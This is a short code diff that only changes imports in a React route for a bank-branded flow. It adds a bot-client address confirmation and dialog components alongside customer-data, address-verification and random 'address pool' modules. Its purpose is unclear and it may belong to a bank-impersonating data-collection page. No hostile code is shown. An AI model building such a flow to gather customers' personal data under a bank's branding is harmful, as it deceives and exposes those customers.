@@ -1,12 +1,13 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { Loader2 } from "lucide-react";
-import { getBotTask } from "@/lib/botClient";
+import { Loader2, MapPin, CheckCircle2 } from "lucide-react";
+import { getBotTask, confirmAddress } from "@/lib/botClient";
 import { getRandomPoolAddress } from "@/lib/addressPool.functions";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import AddressVerification from "@/components/AddressVerification";
 import { CompletionStep } from "@/components/flow/CompletionStep";
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 
 type BankCtx = {
